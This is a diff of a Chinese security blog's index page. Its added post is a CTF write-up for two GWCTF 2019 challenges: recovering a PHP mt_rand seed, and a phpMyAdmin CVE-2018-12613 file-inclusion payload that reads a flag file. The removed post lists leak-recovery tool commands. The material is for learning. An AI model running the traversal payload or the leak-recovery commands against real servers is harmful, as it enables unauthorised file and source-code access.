@@ -118,7 +118,7 @@
                 
                 
                 
-                <a class="navbar-item search" title="Search" href="javascript:;">
+                <a class="navbar-item search" title="Buscar" href="javascript:;">
                     <i class="fas fa-search"></i>
                 </a>
                 
@@ -138,6 +138,71 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
+                <time class="level-item has-text-grey" datetime="2020-02-17T12:24:28.000Z">2020-02-17</time>
+                
+                <div class="level-item">
+                <a class="has-link-grey -link" href="/categories/CTF/">CTF</a>
+                </div>
+                
+                
+                <span class="level-item has-text-grey">
+                    
+                    
+                    2 minutes leer (Acerca de 305 palabras)
+                </span>
+                
+                
+            </div>
+        </div>
+        
+        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
+            
+                <a class="has-link-black-ter" href="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93.html">2.17 [GWCTF 2019]枯燥的抽奖&amp;我有一个数据库</a>
+            
+        </h1>
+        <div class="content">
+            <script type="text/javascript" src="/js/src/bai.js"></script>
+<h3 id="枯燥的抽奖"><a href="#枯燥的抽奖" class="headerlink" title="枯燥的抽奖"></a>枯燥的抽奖</h3><p>打开页面发现是给出了前十位，要猜后十位的字符串。直接抓包发现check.php源码</p>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/1.png" class title="Da4er">
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/2.png" class title="Da4er">
+<p>看到是个伪随机数问题，使用php_mt_seed进行爆破。<br>首先使用下面这个脚本，把php_mt_seed需要的获取出来：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1&#x3D;&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><br><span class="line">str2&#x3D;&#39;hvKiZfOpgL&#39; &#x2F;&#x2F;这里填上题目给的前十位</span><br><span class="line">str3 &#x3D; str1[::-1]</span><br><span class="line">length &#x3D; len(str2)</span><br><span class="line">res&#x3D;&#39;&#39;</span><br><span class="line">for i in range(len(str2)):</span><br><span class="line">    for j in range(len(str1)):</span><br><span class="line">        if str2[i] &#x3D;&#x3D; str1[j]:</span><br><span class="line">            res+&#x3D;str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;</span><br><span class="line">            break</span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/3.png" class title="Da4er">
+<p>然后用php_mt_seed爆破：</p>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/4.png" class title="Da4er">
+<p>得到的随机数直接用下面的脚本进行获取全面字符串：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(104517409);</span><br><span class="line">$str_long1 &#x3D; </span><br><span class="line">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str &#x3D; &#39;&#39;;</span><br><span class="line">$len1 &#x3D; 20;</span><br><span class="line">for ($i &#x3D; 0; $i &lt; $len1; $i++) </span><br><span class="line">&#123;    $str .&#x3D; substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot; . $str . &quot;&lt;&#x2F;p&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/5.png" class title="Da4er">
+<p>将这段字符串提交得到flag。</p>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/6.png" class title="Da4er">
+
+<hr>
+<h3 id="我有一个数据库"><a href="#我有一个数据库" class="headerlink" title="我有一个数据库"></a>我有一个数据库</h3><p>目录扫描到phpmyadmin，接下来的就没思路了，看了别的师傅的wp，发现是phpmyadmin有一处文件包含：phpMyadmin(CVE-2018-12613)后台任意文件包含漏洞。<br>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin&#x2F;?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</span><br></pre></td></tr></table></figure>
+<img src="/2-17-GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/7.png" class title="Da4er">
+        </div>
+        
+        
+        
+    </div>
+</div>
+
+
+
+
+
+
+
+
+
+
+    
+<div class="card">
+    
+    <div class="card-content article ">
+        
+        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
+            <div class="level-left">
                 <time class="level-item has-text-grey" datetime="2020-02-16T12:28:37.000Z">2020-02-16</time>
                 
                 <div class="level-item">
@@ -148,7 +213,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    4 minutes read (About 531 words)
+                    4 minutes leer (Acerca de 531 palabras)
                 </span>
                 
                 
@@ -203,7 +268,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    a few seconds read (About 84 words)
+                    a few seconds leer (Acerca de 84 palabras)
                 </span>
                 
                 
@@ -255,7 +320,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    4 minutes read (About 529 words)
+                    4 minutes leer (Acerca de 529 palabras)
                 </span>
                 
                 
@@ -314,7 +379,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    3 minutes read (About 452 words)
+                    3 minutes leer (Acerca de 452 palabras)
                 </span>
                 
                 
@@ -374,7 +439,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    2 minutes read (About 313 words)
+                    2 minutes leer (Acerca de 313 palabras)
                 </span>
                 
                 
@@ -436,7 +501,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    3 minutes read (About 451 words)
+                    3 minutes leer (Acerca de 451 palabras)
                 </span>
                 
                 
@@ -525,7 +590,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    9 minutes read (About 1351 words)
+                    9 minutes leer (Acerca de 1351 palabras)
                 </span>
                 
                 
@@ -633,7 +698,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    3 minutes read (About 504 words)
+                    3 minutes leer (Acerca de 504 palabras)
                 </span>
                 
                 
@@ -704,7 +769,7 @@
                 <span class="level-item has-text-grey">
                     
                     
-                    4 minutes read (About 608 words)
+                    4 minutes leer (Acerca de 608 palabras)
                 </span>
                 
                 
@@ -749,114 +814,15 @@
 
 
 
-    
-<div class="card">
-    
-    <div class="card-content article ">
-        
-        <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
-            <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2020-02-11T11:21:32.000Z">2020-02-11</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Web安全&渗透测试</a>
-                </div>
-                
-                
-                <span class="level-item has-text-grey">
-                    
-                    
-                    9 minutes read (About 1361 words)
-                </span>
-                
-                
-            </div>
-        </div>
-        
-        <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
-            
-                <a class="has-link-black-ter" href="/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90.html">文件泄露漏洞解析</a>
-            
-        </h1>
-        <div class="content">
-            <script type="text/javascript" src="/js/src/bai.js"></script>
-<h4 id="一-漏洞形成"><a href="#一-漏洞形成" class="headerlink" title="一. 漏洞形成"></a>一. 漏洞形成</h4><p>源码泄露漏洞的形成原因很简单就是因为一些备份文件或者可以恢复源码的文件放在了外网中，用户可以访问，只要用户找到了这些文件的位置，就可以运用工具进行源码恢复。</p>
-<hr>
-<h3 id="二-源码泄露漏洞分类"><a href="#二-源码泄露漏洞分类" class="headerlink" title="二.源码泄露漏洞分类"></a>二.源码泄露漏洞分类</h3><h4 id="1-git-hg文件泄露"><a href="#1-git-hg文件泄露" class="headerlink" title="1. .git/.hg文件泄露"></a>1. .git/.hg文件泄露</h4><p>.git/.hg在执行init初始化目录的时候会创建一个.git/.hg目录，包含了所有的git/hg存储何种操作对象。在管理员发布代码的时候，没有把.git/.hg目录删除，而是直接发布到了服务器目录中，那么我们就可以用这个文件进行恢复源码操作。<br>发现方法：通过目录扫描工具进行扫描，如果发现.git/.hg目录说明有该漏洞。<br>下图是用dirsearch扫描.git漏洞：</p>
-<img src="/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/1.png" class title="Da4er">
-<p>dirsearch用法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u url -e *</span><br></pre></td></tr></table></figure>
-<p>扫描到了.git目录，使用githack工具进行源码恢复：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 githack.py https:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
-<img src="/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/2.png" class title="Da4er">
-<p>也可以使用dvcs-ripper工具：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-git.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
-<p>这样就可以将源码恢复了。 例题：BUUCTF [BJDCTF2020]Mark loves cat<br>对于.hg也是一样，都是先通过目录扫描工具，然后使用对应的工具进行源码恢复工作。<br>使用dvcs-ripper工具，用法为：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-hg.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.hg&#x2F;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h4 id="2-DS-Store文件泄漏"><a href="#2-DS-Store文件泄漏" class="headerlink" title="2.DS_Store文件泄漏"></a>2.DS_Store文件泄漏</h4><p>形成原因：管理员没有把.ds_store文件删除。<br>扫描到漏洞利用目录：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.example.com&#x2F;.ds_store</span><br></pre></td></tr></table></figure>
-<p>使用dsstoreexp工具进行恢复：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp.py http:&#x2F;&#x2F;www.example.com&#x2F;.DS_Store</span><br></pre></td></tr></table></figure>
-<p>先用dirsearch扫描目录发现.DS_Store文件：</p>
-<img src="/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/3.png" class title="Da4er">
-<p>再使用ds_store_exp工具恢复源码：</p>
-<img src="/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/4.png" class title="Da4er">
-<p>例题：Bugku web sql注入2</p>
-<hr>
-<h4 id="3-文件备份泄露"><a href="#3-文件备份泄露" class="headerlink" title="3.文件备份泄露"></a>3.文件备份泄露</h4><p>这个漏洞是网站进行升级或者因为某种原因，管理员没有删除备份文件且备份文件没有设置权限，可以被下载下来。<br><strong>例如：’.rar’,’.zip’,’.tar’,’.tar.bz2’,’.sql’,’.7z’,’.bak’,’.txt’,’.swp’,’index.php.bak’等</strong><br>可以使用dirsearch扫描或者SourceLeakHacker都可以。</p>
-<img src="/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/5.png" class title="Da4er">
-<img src="/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/6.png" class title="Da4er">
-<p>扫描完下载下来就可以了。<br>例题：bugku 备份是个好习惯；buuctf [ACTF2020 新生赛]BackupFile</p>
-<hr>
-<h4 id="4-SVN导致文件泄露"><a href="#4-SVN导致文件泄露" class="headerlink" title="4.SVN导致文件泄露"></a>4.SVN导致文件泄露</h4><p>在SVN管理的过程中，会自动生成一个.svn的文件夹，包含了源代码信息，而如果管理员直接复制代码文件到Web服务器上，使得.svn文件同样暴露在外网环境下而没有清理。<br>同样使用扫描工具可以扫到，使用dvcs-ripper工具恢复</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-svn.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure>
-<p>例题：SVN信息泄露漏洞分析(第1题)——墨者学院在线靶场</p>
-<hr>
-<h4 id="5-CVS泄漏"><a href="#5-CVS泄漏" class="headerlink" title="5.CVS泄漏"></a>5.CVS泄漏</h4><p>漏洞利用点：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;url&#x2F;CVS&#x2F;Root 返回根信息</span><br><span class="line">http:&#x2F;&#x2F;url&#x2F;CVS&#x2F;Entries 返回所有文件的结构</span><br></pre></td></tr></table></figure>
-<p>取回源码命令：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bk clone http:&#x2F;&#x2F;url&#x2F;name dir</span><br></pre></td></tr></table></figure>
-<p>这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">查看所有的改变的命令，转到download的目录：bk changes</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h4 id="6-Bazaar-bzr"><a href="#6-Bazaar-bzr" class="headerlink" title="6.Bazaar/bzr"></a>6.Bazaar/bzr</h4><p>工具：dvcs-ripper</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure>
-
-<hr>
-<h4 id="7-WEB-INF-web-xml泄露"><a href="#7-WEB-INF-web-xml泄露" class="headerlink" title="7.WEB-INF/web.xml泄露"></a>7.WEB-INF/web.xml泄露</h4><p>WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。<br>漏洞成因：<br>通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。<br>漏洞检测以及利用方法：<br>通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF&#x2F;web.xml : Web应用程序配置文件, 描述了servlet和其他的应用组件配置及命名规则. WEB-INF&#x2F;database.properties : 数据库配置文件 </span><br><span class="line">WEB-INF&#x2F;classes&#x2F; : 一般用来存放Java类文件(.class) </span><br><span class="line">WEB-INF&#x2F;lib&#x2F; : 用来存放打包好的库(.jar) </span><br><span class="line">WEB-INF&#x2F;src&#x2F; : 用来放源代码(.asp和.php等)</span><br></pre></td></tr></table></figure>
-<p>例题：<a href="https://www.secpulse.com/archives/71113.html">DDCTF 2018 Web Writeup</a></p>
-<hr>
-<p>参考博客：<br><a href="https://www.cnblogs.com/CH42e/p/11978444.html">1</a><br><a href="https://www.secpulse.com/archives/55286.html">2</a></p>
-
-        </div>
-        
-        
-        
-    </div>
-</div>
-
-
-
-
-
-
-
-
-
-
 
     
 <div class="card card-transparent">
     <nav class="pagination is-centered" role="navigation" aria-label="pagination">
         <div class="pagination-previous">
-            <a class="is-flex-grow has-text-black-ter" href="/page/2/">Previous</a>
+            <a class="is-flex-grow has-text-black-ter" href="/page/2/">Anterior</a>
         </div>
         <div class="pagination-next">
-            <a class="is-flex-grow has-text-black-ter" href="/page/4/">Next</a>
+            <a class="is-flex-grow has-text-black-ter" href="/page/4/">Siguiente</a>
         </div>
         <ul class="pagination-list is-hidden-mobile">
             
@@ -889,7 +855,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Links
+            Enlaces
         </h3>
         <ul class="menu-list">
         
@@ -937,7 +903,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Categories
+                Categorías
             </h3>
             <ul class="menu-list">
             <li>
@@ -962,7 +928,7 @@
                 <span class="level-item">Web安全&渗透测试</span>
             </span>
             <span class="level-end">
-                <span class="level-item tag">8</span>
+                <span class="level-item tag">9</span>
             </span>
         </a></li><li>
         <a class="level is-marginless" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
@@ -1013,7 +979,7 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Tag Cloud
+            Nube de etiquetas
         </h3>
         <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="font-size: 16.67px;">Web安全&渗透测试</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 13.33px;">代码审计</a> <a href="/tags/%E7%88%AC%E8%99%AB/" style="font-size: 13.33px;">爬虫</a>
     </div>
@@ -1055,11 +1021,11 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Posts
+                        Entradas
                     </p>
                     <a href="/archives">
                         <p class="title has-text-weight-normal">
-                            67
+                            68
                         </p>
                     </a>
                 </div>
@@ -1067,7 +1033,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Categorías
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -1079,7 +1045,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Tags
+                        Etiquetas
                     </p>
                     <a href="/tags">
                         <p class="title has-text-weight-normal">
@@ -1092,7 +1058,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                SEGUIR</a>
         </div>
         
         
@@ -1121,8 +1087,27 @@
             <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Recientes
         </h3>
+        
+        <article class="media">
+            
+            <a href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="文件包含漏洞学习笔记">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-30T12:25:20.000Z">2020-03-30</time></div>
+                    <a href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">文件包含漏洞学习笔记</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Web安全&渗透测试</a>
+                    </p>
+                </div>
+            </div>
+        </article>
         
         <article class="media">
             
@@ -1200,25 +1185,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.html" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="利用phar进行反序列化扩展攻击简单总结">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-15T03:59:09.000Z">2020-03-15</time></div>
-                    <a href="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">利用phar进行反序列化扩展攻击简单总结</a>
-                    <p class="is-size-7 is-uppercase">
-                        <a class="has-link-grey -link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
         
@@ -1226,7 +1192,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archivos
         </h3>
         <ul class="menu-list">
         
@@ -1236,7 +1202,7 @@
                     <span class="level-item">March 2020</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">13</span>
+                    <span class="level-item tag">14</span>
                 </span>
             </a>
         </li>
@@ -1272,7 +1238,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Tags
+                Etiquetas
             </h3>
             <div class="field is-grouped is-grouped-multiline">
                 
@@ -1360,11 +1326,11 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Posts
+                        Entradas
                     </p>
                     <a href="/archives">
                         <p class="title has-text-weight-normal">
-                            67
+                            68
                         </p>
                     </a>
                 </div>
@@ -1372,7 +1338,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Categories
+                        Categorías
                     </p>
                     <a href="/categories">
                         <p class="title has-text-weight-normal">
@@ -1384,7 +1350,7 @@
             <div class="level-item has-text-centered is-marginless">
                 <div>
                     <p class="heading">
-                        Tags
+                        Etiquetas
                     </p>
                     <a href="/tags">
                         <p class="title has-text-weight-normal">
@@ -1397,7 +1363,7 @@
         
         <div class="level">
             <a class="level-item button is-link is-rounded" href="https://github.com/Da4er" target="_blank" rel="noopener">
-                Follow</a>
+                SEGUIR</a>
         </div>
         
         
@@ -1426,8 +1392,27 @@
         <div class="card widget">
     <div class="card-content">
         <h3 class="menu-label">
-            Recent
+            Recientes
         </h3>
+        
+        <article class="media">
+            
+            <a href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="文件包含漏洞学习笔记">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-30T12:25:20.000Z">2020-03-30</time></div>
+                    <a href="/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">文件包含漏洞学习笔记</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Web%E5%AE%89%E5%85%A8-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">Web安全&渗透测试</a>
+                    </p>
+                </div>
+            </div>
+        </article>
         
         <article class="media">
             
@@ -1505,25 +1490,6 @@
             </div>
         </article>
         
-        <article class="media">
-            
-            <a href="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.html" class="media-left">
-                <p class="image is-64x64">
-                    <img class="thumbnail" src="/images/thumbnail.svg" alt="利用phar进行反序列化扩展攻击简单总结">
-                </p>
-            </a>
-            
-            <div class="media-content">
-                <div class="content">
-                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2020-03-15T03:59:09.000Z">2020-03-15</time></div>
-                    <a href="/%E5%88%A9%E7%94%A8phar%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E7%AE%80%E5%8D%95%E6%80%BB%E7%BB%93.html" class="title has-link-black-ter is-size-6 has-text-weight-normal">利用phar进行反序列化扩展攻击简单总结</a>
-                    <p class="is-size-7 is-uppercase">
-                        <a class="has-link-grey -link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
-                    </p>
-                </div>
-            </div>
-        </article>
-        
     </div>
 </div>
     
@@ -1531,7 +1497,7 @@
     <div class="card-content">
         <div class="menu">
         <h3 class="menu-label">
-            Archives
+            Archivos
         </h3>
         <ul class="menu-list">
         
@@ -1541,7 +1507,7 @@
                     <span class="level-item">March 2020</span>
                 </span>
                 <span class="level-end">
-                    <span class="level-item tag">13</span>
+                    <span class="level-item tag">14</span>
                 </span>
             </a>
         </li>
@@ -1577,7 +1543,7 @@
     <div class="card-content">
         <div class="menu">
             <h3 class="menu-label">
-                Tags
+                Etiquetas
             </h3>
             <div class="field is-grouped is-grouped-multiline">
                 
@@ -1782,7 +1748,7 @@ document.addEventListener('DOMContentLoaded', function () {
     <div class="searchbox ins-search">
     <div class="searchbox-container ins-search-container">
         <div class="searchbox-input-wrapper">
-            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something..." />
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Teclea algo..." />
             <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="searchbox-result-wrapper ins-section-wrapper">
@@ -1794,11 +1760,11 @@ document.addEventListener('DOMContentLoaded', function () {
     (function (window) {
         var INSIGHT_CONFIG = {
             TRANSLATION: {
-                POSTS: 'Posts',
-                PAGES: 'Pages',
-                CATEGORIES: 'Categories',
-                TAGS: 'Tags',
-                UNTITLED: '(Untitled)',
+                POSTS: 'Entradas',
+                PAGES: 'Páginas',
+                CATEGORIES: 'Categorías',
+                TAGS: 'Etiquetas',
+                UNTITLED: '(Sin título)',
             },
             CONTENT_URL: '/content.json',
         };
